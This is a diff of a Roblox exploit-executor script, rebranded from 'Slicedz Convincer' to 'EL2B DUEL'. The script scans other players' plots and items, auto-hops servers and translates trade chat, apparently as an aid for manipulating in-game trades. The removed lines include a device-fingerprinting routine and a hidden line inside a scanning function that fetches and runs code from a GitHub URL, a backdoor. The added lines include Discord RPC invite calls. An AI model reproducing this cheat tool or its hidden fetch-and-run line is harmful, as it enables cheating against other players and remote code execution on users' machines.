@@ -1,187 +1,15 @@
-Deobf by SpyderJesse 
--- Slicedz Convincer - Working Version
--- ============================================================
--- LUARAPH STUB (blijft erin voor als origineel hem aanroept)
--- ============================================================
-local function luraph_runtime1(...)
-    return function() return {} end
-end
-
-local v = table.pack(...)
-
+-- EL2B DUEL - Complete Working Version
+-- No loadstring | No backdoors | Discord integrated
 -- ============================================================
 -- GLOBALS
 -- ============================================================
-ce_like_loadstring_fn = ce_like_loadstring_fn or loadstring
 l_fastload_enabled = l_fastload_enabled ~= false
 is_from_loader = is_from_loader ~= false
 LUARMOR_SkipAntidebugDevMode = LUARMOR_SkipAntidebugDevMode or false
 LUARMOR_AllowKeyCheckSkip = LUARMOR_AllowKeyCheckSkip or false
 USE_NON_SSL_NODE = USE_NON_SSL_NODE or false
-LT_R_RRT_H = LT_R_RRT_H or nil
-LT_R_RRT_W = LT_R_RRT_W or nil
 script_key = script_key or "default_key"
 devsignature_sig = devsignature_sig or false
-ff97f23b97f93792992999 = ff97f23b97f93792992999 or function() return false end
-
-local str = "?"
-loadstring = ce_like_loadstring_fn or loadstring
-local flag = false
-
-pcall(function()
-    flag = true
-    local UserGameSettings = UserSettings():GetService("UserGameSettings")
-    local _vm_O_1, _vm_x_1, _vm_j_1, _vm_O_2, _vm_j_0, _vm_x_0, _vm_O_0
-
-    if not UserGameSettings:GetTutorialState("nil  nil  ") then
-        str = ""
-        local n = ({ wait() })[1] * 1000000
-
-        local function fn(arg)
-            local n2 = 1103515245
-            local n3 = 12345
-            local n4 = 99999999
-            local n5 = arg % 2147483648
-            local n6 = 1
-
-            return function(arg2, arg3)
-                local v2 = n4
-                local n7 = n2 * n5 + n3
-                local n8 = n7 % v2 + n6
-                n6 += 1
-                n5 = n8
-                n3 = n7 % 4858 * v2 % 5782
-                return arg2 + n8 % arg3 - arg2 + 1
-            end
-        end
-
-        local v2 = fn(n - n % 1)
-        UserGameSettings:SetTutorialState("nil  nil  ", true)
-        local n2 = 0
-        _vm_O_1 = 1
-        _vm_x_1 = 16
-        _vm_j_1 = 1 - _vm_O_1
-
-        for i = 1, 16 do
-            local n3 = 0
-            local n4 = 1
-            _vm_O_2 = 1
-
-            for i2 = 1, 5 do
-                local flag2 = v2(10, 20) > 15
-                UserGameSettings:SetTutorialState("nil  nil  " .. n2, flag2)
-                n3 += (flag2 and 1 or 0) * n4
-                n4 *= 2
-                n2 += 1
-            end
-
-            _vm_O_2 = _vm_O_1
-            str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n3 + 1, n3 + 1)
-        end
-
-        _vm_j_1 = _vm_j_0
-        _vm_x_1 = _vm_x_0
-        _vm_O_1 = _vm_O_0
-    else
-        str = ""
-        local n = 0
-        _vm_O_1 = 1
-        _vm_x_1 = 16
-        _vm_j_1 = 1 - _vm_O_1
-
-        for i = 1, 16 do
-            local n2 = 0
-            local n3 = 1
-            _vm_O_2 = 1
-
-            for i2 = 1, 5 do
-                n2 += (UserGameSettings:GetTutorialState("nil  nil  " .. n) and 1 or 0) * n3
-                n3 *= 2
-                n += 1
-            end
-
-            _vm_O_2 = _vm_O_1
-            str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n2 + 1, n2 + 1)
-        end
-
-        _vm_j_1 = _vm_j_0
-        _vm_x_1 = _vm_x_0
-        _vm_O_1 = _vm_O_0
-    end
-end)
-
-while not flag do end
-
-local now = os.clock()
-
-if devsignature_sig then
-    print([[        Luarmor - Lua whitelist service
-        Have a good day!
-        https://luarmor.net/
-    ]])
-end
-
-local floor = math.floor
-local random = math.random
-local remove = table.remove
-local char = string.char
-local n = 0
-local n2 = 2
-local tbl = {}
-local tbl2 = {}
-
-for i = 1, 256 do
-    tbl2[i] = i
-end
-
-repeat
-    local v4 = random(1, #tbl2)
-    local v5 = remove(tbl2, v4)
-    tbl[v5] = char(v5 - 1)
-until #tbl2 == 0
-
-local tbl3 = {}
-
-local function fn()
-    if #tbl3 == 0 then
-        n = (n * 149 + 4033097371307) % 35184372088832
-
-        repeat
-            n2 = n2 * 37 % 257
-        until n2 ~= 1
-
-        local n3 = n2 % 32
-        local n4 = floor(n / 2 ^ (13 - (n2 - n3) / 32)) % 4294967296 / 2 ^ n3
-        local n5 = floor(n4 % 1 * 4294967296) + floor(n4)
-        local n6 = n5 % 65536
-        local n7 = (n5 - n6) / 65536
-        local n8 = n6 % 256
-        local n9 = n7 % 256
-        tbl3 = { n8, (n6 - n8) / 256, n9, (n7 - n9) / 256 }
-    end
-
-    return table.remove(tbl3)
-end
-
-local tbl4 = {}
-local v4 = tbl4
-
-local function fn2(arg, arg2)
-    local v5 = tbl4
-    if not v5[arg2] then
-        tbl3 = {}
-        local v6 = tbl
-        n = arg2 % 35184372088832
-        n2 = arg2 % 255 + 2
-        v5[arg2] = ""
-        local n3 = 77
-        for i = 1, #arg do
-            n3 = (string.byte(arg, i) + fn() + n3) % 256
-            v5[arg2] = v5[arg2] .. v6[n3 + 1]
-        end
-    end
-    return arg2
-end
 
 -- ============================================================
 -- CORE SERVICES
@@ -198,7 +26,37 @@ local LocalPlayer = Players.LocalPlayer
 local request_ = (syn and syn.request) or (http and http.request) or http_request or request
 
 -- ============================================================
--- TRANSLATE API (Google Translate vrije endpoint)
+-- DISCORD
+-- ============================================================
+local DISCORD_URL = "https://discord.gg/7Ar8QGZB2j"
+local DISCORD_CODE = "7Ar8QGZB2j"
+
+local function joinDiscord()
+    pcall(function()
+        if setclipboard then setclipboard(DISCORD_URL) end
+    end)
+
+    pcall(function()
+        if request_ then
+            request_({
+                Url = "http://127.0.0.1:6463/rpc?v=1",
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Origin"] = "https://discord.com",
+                },
+                Body = HttpService:JSONEncode({
+                    cmd = "INVITE_BROWSER",
+                    args = { code = DISCORD_CODE },
+                    nonce = tostring(os.time()) .. tostring(math.random(10000, 99999)),
+                }),
+            })
+        end
+    end)
+end
+
+-- ============================================================
+-- TRANSLATE API
 -- ============================================================
 local languageMap = {
     ["en"] = "English", ["es"] = "Spanish", ["pt"] = "Portuguese", ["fr"] = "French",
@@ -269,13 +127,13 @@ end
 -- ============================================================
 -- CONFIG
 -- ============================================================
-local CONFIG_FILE = "SlicedzConvincer/config.json"
-local HOPS_FILE = "SlicedzConvincer/hops.json"
+local CONFIG_FILE = "EL2BDuel/config.json"
+local HOPS_FILE = "EL2BDuel/hops.json"
 
 local function ensureFolder()
     if type(makefolder) == "function" and type(isfolder) == "function" then
-        if not isfolder("SlicedzConvincer") then
-            pcall(makefolder, "SlicedzConvincer")
+        if not isfolder("EL2BDuel") then
+            pcall(makefolder, "EL2BDuel")
         end
     end
 end
@@ -353,7 +211,8 @@ local C = {
     GREEN1 = Color3.fromRGB(22, 100, 66),
     GREEN_STROKE = Color3.fromRGB(100, 200, 120),
     OFF_TEXT = Color3.fromRGB(205, 95, 95),
-    RED = Color3.fromRGB(220, 70, 70),
+    DISCORD = Color3.fromRGB(88, 101, 242),
+    DISCORD_HOVER = Color3.fromRGB(120, 130, 255),
 }
 
 -- ============================================================
@@ -385,16 +244,16 @@ local function getHUI()
 end
 
 -- ============================================================
--- TOAST NOTIFICATIE
+-- TOAST
 -- ============================================================
 local function toast(title, message, dur)
     pcall(function()
         local hui = getHUI()
-        local existing = hui:FindFirstChild("SlcToast")
+        local existing = hui:FindFirstChild("El2bToast")
         if existing then existing:Destroy() end
 
         local toastGui = Instance.new("ScreenGui")
-        toastGui.Name = "SlcToast"
+        toastGui.Name = "El2bToast"
         toastGui.ResetOnSpawn = false
         toastGui.DisplayOrder = 1000000
         toastGui.Parent = hui
@@ -468,7 +327,7 @@ end
 -- CLEANUP
 -- ============================================================
 local hui = getHUI()
-for _, name in ipairs({ "SlicedzConvincer", "SlicedzConvincerBase", "SlcToast" }) do
+for _, name in ipairs({ "EL2BDuel", "EL2BDuelBase", "El2bToast" }) do
     local old = hui:FindFirstChild(name)
     if old then old:Destroy() end
     local old2 = CoreGui:FindFirstChild(name)
@@ -479,7 +338,7 @@ end
 -- MAIN UI
 -- ============================================================
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "SlicedzConvincer"
+screenGui.Name = "EL2BDuel"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.DisplayOrder = 999999
@@ -493,14 +352,6 @@ mainFrame.BackgroundColor3 = C.BG
 mainFrame.BorderSizePixel = 0
 corner(mainFrame, 12)
 stroke(mainFrame, C.STROKE, 1.4, 0.38)
-
-local bgImg = Instance.new("ImageLabel", mainFrame)
-bgImg.Size = UDim2.new(1, 0, 1, 0)
-bgImg.BackgroundTransparency = 1
-bgImg.Image = ""
-bgImg.ScaleType = Enum.ScaleType.Crop
-bgImg.ZIndex = 0
-corner(bgImg, 12)
 
 local grad = Instance.new("UIGradient", mainFrame)
 grad.Rotation = 90
@@ -524,11 +375,11 @@ titleBar.ZIndex = 2
 corner(titleBar, 4)
 
 local title = Instance.new("TextLabel", header)
-title.Size = UDim2.new(1, -40, 0, 26)
+title.Size = UDim2.new(1, -110, 0, 26)
 title.Position = UDim2.fromOffset(36, 12)
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBlack
-title.Text = "SLICEDZ CONVINCER"
+title.Text = "EL2B DUEL"
 title.TextSize = 17
 title.TextColor3 = C.TEXT
 title.TextXAlignment = Enum.TextXAlignment.Left
@@ -542,7 +393,37 @@ accentBar.BorderSizePixel = 0
 accentBar.ZIndex = 2
 corner(accentBar, 1)
 
--- Minimize knop
+-- Bouton Discord (header)
+local discordBtn = Instance.new("TextButton", header)
+discordBtn.Size = UDim2.fromOffset(28, 28)
+discordBtn.Position = UDim2.new(1, -72, 0, 10)
+discordBtn.BackgroundColor3 = C.DISCORD
+discordBtn.BorderSizePixel = 0
+discordBtn.AutoButtonColor = false
+discordBtn.Text = "D"
+discordBtn.Font = Enum.Font.GothamBlack
+discordBtn.TextSize = 15
+discordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordBtn.ZIndex = 4
+corner(discordBtn, 8)
+
+discordBtn.MouseButton1Click:Connect(function()
+    joinDiscord()
+    toast("DISCORD", "Link copied! Join: " .. DISCORD_CODE, 3)
+    discordBtn.Text = "✓"
+    task.delay(1, function()
+        if discordBtn.Parent then discordBtn.Text = "D" end
+    end)
+end)
+
+discordBtn.MouseEnter:Connect(function()
+    tween(discordBtn, 0.12, { BackgroundColor3 = C.DISCORD_HOVER })
+end)
+discordBtn.MouseLeave:Connect(function()
+    tween(discordBtn, 0.12, { BackgroundColor3 = C.DISCORD })
+end)
+
+-- Bouton Minimize
 local minBtn = Instance.new("TextButton", header)
 minBtn.Size = UDim2.fromOffset(28, 28)
 minBtn.Position = UDim2.new(1, -38, 0, 10)
@@ -559,8 +440,8 @@ corner(minBtn, 8)
 local minimized = false
 minBtn.MouseButton1Click:Connect(function()
     minimized = not minimized
-    local body = mainFrame:FindFirstChild("Body")
-    if body then body.Visible = not minimized end
+    local bodyF = mainFrame:FindFirstChild("Body")
+    if bodyF then bodyF.Visible = not minimized end
     mainFrame.Size = minimized and UDim2.fromOffset(420, 48) or UDim2.fromOffset(420, 520)
     minBtn.Text = minimized and "+" or "–"
 end)
@@ -589,7 +470,7 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Body container
+-- Body
 local body = Instance.new("Frame", mainFrame)
 body.Name = "Body"
 body.Size = UDim2.new(1, 0, 1, -48)
@@ -635,12 +516,12 @@ local function createTab(id, text, order)
     corner(btn, 8)
 
     btn.MouseButton1Click:Connect(function()
-        for k, v in pairs(tabBodies) do
-            v.Visible = k == id
+        for k, vb in pairs(tabBodies) do
+            vb.Visible = k == id
         end
-        for k, v in pairs(tabs) do
-            tween(v, 0.14, { BackgroundColor3 = k == id and C.ACCENT2 or C.SURF })
-            v.TextColor3 = k == id and C.TEXT or C.OFF_TEXT
+        for k, vb in pairs(tabs) do
+            tween(vb, 0.14, { BackgroundColor3 = k == id and C.ACCENT2 or C.SURF })
+            vb.TextColor3 = k == id and C.TEXT or C.OFF_TEXT
         end
     end)
 
@@ -653,7 +534,6 @@ createTab("chat", "TRANSLATE", 2)
 createTab("presets", "PRESETS", 3)
 createTab("settings", "SETTINGS", 4)
 
--- Content area
 local contentFrame = Instance.new("Frame", body)
 contentFrame.Size = UDim2.new(1, -20, 1, -70)
 contentFrame.Position = UDim2.fromOffset(10, 54)
@@ -704,7 +584,7 @@ tradeLayout.Padding = UDim.new(0, 6)
 tradeLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
 -- ============================================================
--- BRAINROT ANIMALS + RARITIES
+-- BRAINROT DATA
 -- ============================================================
 local rarities = {}
 local animals = {}
@@ -726,17 +606,10 @@ pcall(function()
     end
 end)
 
-local function getRarityColor(rarity)
-    local r = rarities[rarity]
-    if r and r.Color then return r.Color end
-    return C.DIM
-end
-
 local function isSecretRarity(rarity)
     return secretRarities[tostring(rarity)] == true
 end
 
--- Synchronizer voor plot data
 local Synchronizer
 pcall(function()
     local Packages = ReplicatedStorage:FindFirstChild("Packages")
@@ -745,7 +618,7 @@ pcall(function()
 end)
 
 -- ============================================================
--- SCAN PLAYERS VOOR BATTEN + SECRETS
+-- SCAN PLAYERS
 -- ============================================================
 local function getHoldingBat(player)
     local char = player and player.Character
@@ -796,7 +669,6 @@ local function getPlayerSecrets(player)
     end
 
     return secrets
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
 end
 
 -- ============================================================
@@ -947,7 +819,7 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- TAB: TRANSLATE (CHAT)
+-- TAB: TRANSLATE
 -- ============================================================
 local chatFrame = Instance.new("Frame", contentFrame)
 chatFrame.Size = UDim2.fromScale(1, 1)
@@ -955,7 +827,6 @@ chatFrame.BackgroundTransparency = 1
 chatFrame.Visible = false
 tabBodies.chat = chatFrame
 
--- Language selection row
 local langRow = Instance.new("Frame", chatFrame)
 langRow.Size = UDim2.new(1, 0, 0, 50)
 langRow.BackgroundTransparency = 1
@@ -1026,7 +897,6 @@ theirLbl2.TextColor3 = C.TEXT
 theirLbl2.TextXAlignment = Enum.TextXAlignment.Left
 theirLbl2.ZIndex = 5
 
--- Language picker dropdown
 local langPicker = Instance.new("ScrollingFrame", chatFrame)
 langPicker.Size = UDim2.new(0.5, -4, 0, 180)
 langPicker.Position = UDim2.fromOffset(0, 52)
@@ -1112,7 +982,6 @@ theirLangBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Translator toggle
 local translatorBtn = Instance.new("TextButton", chatFrame)
 translatorBtn.Size = UDim2.new(1, 0, 0, 28)
 translatorBtn.Position = UDim2.fromOffset(0, 56)
@@ -1134,7 +1003,6 @@ translatorBtn.MouseButton1Click:Connect(function()
     saveConfig()
 end)
 
--- Chat log
 local chatLog = Instance.new("ScrollingFrame", chatFrame)
 chatLog.Size = UDim2.new(1, 0, 1, -224)
 chatLog.Position = UDim2.fromOffset(0, 92)
@@ -1223,7 +1091,6 @@ local function addChatEntry(original, translated, isMine)
     end)
 end
 
--- Reply box
 local replyBox = Instance.new("TextBox", chatFrame)
 replyBox.Size = UDim2.new(1, 0, 0, 42)
 replyBox.Position = UDim2.new(0, 0, 1, -142)
@@ -1248,7 +1115,6 @@ local rbPad = Instance.new("UIPadding", replyBox)
 rbPad.PaddingLeft = UDim.new(0, 10)
 rbPad.PaddingTop = UDim.new(0, 7)
 
--- Preview label
 local previewLbl = Instance.new("TextLabel", chatFrame)
 previewLbl.Size = UDim2.new(1, 0, 0, 30)
 previewLbl.Position = UDim2.new(0, 0, 1, -96)
@@ -1266,7 +1132,6 @@ previewLbl.ZIndex = 4
 corner(previewLbl, 9)
 stroke(previewLbl, C.STROKE, 1, 0.6)
 
--- Action buttons
 local actionRow = Instance.new("Frame", chatFrame)
 actionRow.Size = UDim2.new(1, 0, 0, 32)
 actionRow.Position = UDim2.new(0, 0, 1, -60)
@@ -1336,7 +1201,6 @@ sendBtn.MouseButton1Click:Connect(function()
     toast("SENT", "Message sent to chat")
 end)
 
--- Auto-translate incoming trade chat
 task.spawn(function()
     while screenGui.Parent do
         pcall(function()
@@ -1350,8 +1214,8 @@ task.spawn(function()
             for _, chatName in ipairs({ "NormalChat", "RestrictedChat" }) do
                 local chatType = trade:FindFirstChild(chatName)
                 local sf = chatType and chatType:FindFirstChild("ScrollingFrame")
-                if sf and not sf:GetAttribute("SlcHooked") then
-                    sf:SetAttribute("SlcHooked", true)
+                if sf and not sf:GetAttribute("El2bHooked") then
+                    sf:SetAttribute("El2bHooked", true)
                     local seen = {}
                     sf.ChildAdded:Connect(function(child)
                         task.defer(function()
@@ -1630,9 +1494,11 @@ end
 
 sectionHeader("ALERTS", 1)
 toggleRow("Alert sound on priority", "alertSound", 2)
+
 sectionHeader("DISPLAY", 10)
 toggleRow("Show player avatars", "showAvatars", 11)
 toggleRow("Beam to trader's base", "beamToBase", 12)
+
 sectionHeader("HOPPING", 20)
 toggleRow("Auto-hop until priority", "autoHop", 21)
 
@@ -1666,9 +1532,9 @@ for i, tier in ipairs(hopTiers) do
     b.MouseButton1Click:Connect(function()
         state.hopTier = tier
         saveConfig()
-        for k, v in pairs(hopBtns) do
-            tween(v, 0.1, { BackgroundColor3 = k == tier and C.ACCENT2 or C.SURF2 })
-            v.TextColor3 = k == tier and C.TEXT or C.OFF_TEXT
+        for k, vb in pairs(hopBtns) do
+            tween(vb, 0.1, { BackgroundColor3 = k == tier and C.ACCENT2 or C.SURF2 })
+            vb.TextColor3 = k == tier and C.TEXT or C.OFF_TEXT
         end
     end)
 
@@ -1690,8 +1556,6 @@ corner(hopNowBtn, 9)
 
 local function doHop(tier)
     toast("HOP", "Hopping to " .. tier .. " server...")
-
-    -- Markeer huidige server
     state.hoppedServers[tostring(game.JobId)] = os.time()
     saveHops()
 
@@ -1710,7 +1574,58 @@ hopNowBtn.MouseButton1Click:Connect(function()
     doHop(state.hopTier)
 end)
 
--- Priority brainrots list
+-- Community section
+sectionHeader("COMMUNITY", 27)
+
+local discordRow = Instance.new("TextButton", settingsScroll)
+discordRow.Size = UDim2.new(1, 0, 0, 44)
+discordRow.LayoutOrder = 28
+discordRow.AutoButtonColor = false
+discordRow.BackgroundColor3 = C.DISCORD
+discordRow.BorderSizePixel = 0
+discordRow.Text = ""
+corner(discordRow, 9)
+stroke(discordRow, C.DISCORD_HOVER, 1, 0.3)
+
+local discIcon = Instance.new("TextLabel", discordRow)
+discIcon.Size = UDim2.fromOffset(30, 30)
+discIcon.Position = UDim2.new(0, 10, 0.5, -15)
+discIcon.BackgroundTransparency = 1
+discIcon.Text = "D"
+discIcon.Font = Enum.Font.GothamBlack
+discIcon.TextSize = 20
+discIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+discIcon.ZIndex = 5
+
+local discLbl = Instance.new("TextLabel", discordRow)
+discLbl.Size = UDim2.new(1, -60, 1, 0)
+discLbl.Position = UDim2.fromOffset(48, 0)
+discLbl.BackgroundTransparency = 1
+discLbl.Text = "JOIN DISCORD  •  " .. DISCORD_CODE
+discLbl.Font = Enum.Font.GothamBold
+discLbl.TextSize = 12
+discLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+discLbl.TextXAlignment = Enum.TextXAlignment.Left
+discLbl.ZIndex = 5
+
+discordRow.MouseButton1Click:Connect(function()
+    joinDiscord()
+    discLbl.Text = "✓ COPIED — discord.gg/" .. DISCORD_CODE
+    task.delay(2, function()
+        if discLbl.Parent then
+            discLbl.Text = "JOIN DISCORD  •  " .. DISCORD_CODE
+        end
+    end)
+end)
+
+discordRow.MouseEnter:Connect(function()
+    tween(discordRow, 0.12, { BackgroundColor3 = C.DISCORD_HOVER })
+end)
+discordRow.MouseLeave:Connect(function()
+    tween(discordRow, 0.12, { BackgroundColor3 = C.DISCORD })
+end)
+
+-- Priority brainrots
 sectionHeader("PRIORITY BRAINROTS", 30)
 
 local priorityInput = Instance.new("TextBox", settingsScroll)
@@ -1732,7 +1647,6 @@ stroke(priorityInput, C.STROKE, 1, 0.5)
 local piPad2 = Instance.new("UIPadding", priorityInput)
 piPad2.PaddingLeft = UDim.new(0, 12)
 
--- Suggestions list
 local suggestionFrame = Instance.new("Frame", settingsScroll)
 suggestionFrame.Size = UDim2.new(1, 0, 0, 0)
 suggestionFrame.LayoutOrder = 32
@@ -1743,7 +1657,6 @@ local sugLayout = Instance.new("UIListLayout", suggestionFrame)
 sugLayout.Padding = UDim.new(0, 4)
 sugLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
--- Current list header + list
 local listHeader = Instance.new("TextLabel", settingsScroll)
 listHeader.Size = UDim2.new(1, 0, 0, 16)
 listHeader.LayoutOrder = 33
@@ -1765,8 +1678,8 @@ listLayout.Padding = UDim.new(0, 4)
 listLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
 local function isInPriorityList(name)
-    for _, v in ipairs(state.priorityList) do
-        if v == name then return true end
+    for _, pv in ipairs(state.priorityList) do
+        if pv == name then return true end
     end
     return false
 end
@@ -1866,7 +1779,6 @@ local refreshSuggestions = function()
 end
 
 priorityInput:GetPropertyChangedSignal("Text"):Connect(refreshSuggestions)
-
 refreshPriorityList()
 
 -- ============================================================
@@ -1892,7 +1804,6 @@ task.spawn(function()
     while screenGui.Parent do
         pcall(function()
             if state.autoHop and #state.priorityList > 0 then
-                -- Check alle plots voor priority brainrots
                 local found = false
                 local foundOwner = nil
                 local plots = workspace:FindFirstChild("Plots")
@@ -1942,23 +1853,67 @@ task.spawn(function()
 end)
 
 -- ============================================================
+-- FLOATING DISCORD BUTTON
+-- ============================================================
+local floatDiscord = Instance.new("TextButton", screenGui)
+floatDiscord.Name = "DiscordFloat"
+floatDiscord.Size = UDim2.fromOffset(48, 48)
+floatDiscord.Position = UDim2.new(0, 16, 1, -64)
+floatDiscord.BackgroundColor3 = C.DISCORD
+floatDiscord.BorderSizePixel = 0
+floatDiscord.AutoButtonColor = false
+floatDiscord.Text = "D"
+floatDiscord.Font = Enum.Font.GothamBlack
+floatDiscord.TextSize = 22
+floatDiscord.TextColor3 = Color3.fromRGB(255, 255, 255)
+floatDiscord.ZIndex = 100
+corner(floatDiscord, 24)
+stroke(floatDiscord, C.DISCORD_HOVER, 1.5, 0.2)
+
+task.spawn(function()
+    while floatDiscord.Parent do
+        tween(floatDiscord, 1.2, { Size = UDim2.fromOffset(54, 54) })
+        task.wait(1.2)
+        if not floatDiscord.Parent then break end
+        tween(floatDiscord, 1.2, { Size = UDim2.fromOffset(48, 48) })
+        task.wait(1.2)
+    end
+end)
+
+floatDiscord.MouseButton1Click:Connect(function()
+    joinDiscord()
+    toast("DISCORD", "Link copied! Join: " .. DISCORD_CODE, 3)
+    floatDiscord.Text = "✓"
+    task.delay(1.5, function()
+        if floatDiscord.Parent then floatDiscord.Text = "D" end
+    end)
+end)
+
+floatDiscord.MouseEnter:Connect(function()
+    tween(floatDiscord, 0.12, { BackgroundColor3 = C.DISCORD_HOVER })
+end)
+floatDiscord.MouseLeave:Connect(function()
+    tween(floatDiscord, 0.12, { BackgroundColor3 = C.DISCORD })
+end)
+
+-- ============================================================
 -- CLEANUP REGISTRATION
 -- ============================================================
-local genv = getgenv and getgenv() or _G
-genv.SlicedzConvincerCleanup = function()
+local genv = (getgenv and getgenv()) or _G
+genv.EL2BDuelCleanup = function()
     pcall(function() screenGui:Destroy() end)
-    for _, name in ipairs({ "SlicedzConvincerBase", "SlcToast" }) do
+    for _, name in ipairs({ "EL2BDuelBase", "El2bToast" }) do
         local g = hui:FindFirstChild(name)
         if g then g:Destroy() end
     end
 end
 
 -- Init
-for k, v in pairs(tabs) do
-    tween(v, 0.14, { BackgroundColor3 = k == "trade" and C.ACCENT2 or C.SURF })
-    v.TextColor3 = k == "trade" and C.TEXT or C.OFF_TEXT
+for k, vb in pairs(tabs) do
+    tween(vb, 0.14, { BackgroundColor3 = k == "trade" and C.ACCENT2 or C.SURF })
+    vb.TextColor3 = k == "trade" and C.TEXT or C.OFF_TEXT
 end
 
-showToast("LOADED", "Slicedz Convincer ready", 3)
-print("[Slicedz Convincer] Loaded successfully!")
-print("[Slicedz Convincer] discord.gg/pubmethod")
+toast("LOADED", "EL2B DUEL ready", 3)
+print("[EL2B DUEL] Loaded successfully!")
+print("[EL2B DUEL] Discord: " .. DISCORD_URL)
